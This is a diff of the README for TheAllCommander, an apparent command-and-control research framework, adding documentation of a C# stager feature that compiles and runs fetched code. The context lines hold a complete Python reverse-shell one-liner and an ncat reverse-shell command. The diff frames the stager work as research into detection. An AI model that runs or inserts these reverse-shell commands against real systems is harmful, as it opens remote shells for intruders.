@@ -31,7 +31,9 @@ Currently, TheAllCommander has been tested with the following payloads:
 3) "Python oneliner" ->  TheAllCommander can receive connections from python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'
 		Note: This has been tested with /bin/sh and the $ will be removed to normalize IO with a Linux ncat shell
 4) ncat <ip> <port> -e cmd | /bin/bash -> works on both Linux and Windows
-5) The author has developed C++ and C# payloads which are available only for limited release. Until a framework for public release can be developed, they will be held for release on an individually assessed basis.
+5) TheAllCommander has been augmented with the ability to parse C# code and serve it to a C# stager. At present, only a harmless "Hello World" example is provided to demonstrate client-side indicators of compromise. See "C# Staging" below.
+6) The author has developed C++ and C# payloads which are available only for limited release. Until a framework for public release can be developed, they will be held for release on an individually assessed basis.
+ 
 
 # Commands
 The following commands are supported in the default protocol test daemon:
@@ -198,6 +200,19 @@ wire.encrypt.key=AQIDBAUGBwgJCgsMDQ4PEA==
 daemon.reportinginterval.expectedmaxclient
 
 daemon.reportinginterval.multiplesexpectedmaxclient
+
+#C# Staging
+
+C# code can compile and run other C# code at runtime. This gives malware developers the ability to write small stagers, which then pull from a remote source the "real" malware. To model for this sort procedure, TheAllCommander can automatically generate one of these stagers. The first stage is generated from the text line interface to TheAllCommander, with the commands shown below. The server will then assemble the payload to transmit. It will use a headers file to pre-pend all the C# declarations needed, followed by a concatenated set of source files. The stager will receive these source files, compile them in real time, and then execute the stager.
+
+In terms of indicators of compromise, this will write a temporary file to disk. This provides defender or other antivirus solutions the opportunity to inspect the executable contents before they are run. However, I think there is additional opportunity to detect the staging logic itself, which is the motivation behind creating this feature. As I research this further and develop mitigation strategies, I'll be documenting these findings.
+
+To configure the header file within the csharp_payload directory, please use the parameter "daemon.payload.csharp.masterimport=headers"
+
+To change the default served payload, please use the parameter "daemon.payload.csharp.filelist=HelloWorld.cs"  
+
+From the text client for TheAllCommander, please select the "WIZARD" option when prompted on startup. The commands to create either a text stager or a pre-compiled stager will be printed there.
+	Note: The stager is only compiled for the user by TheAllCommander server if the server is run on Windows.
 
 # Dependencies
 Java JDK
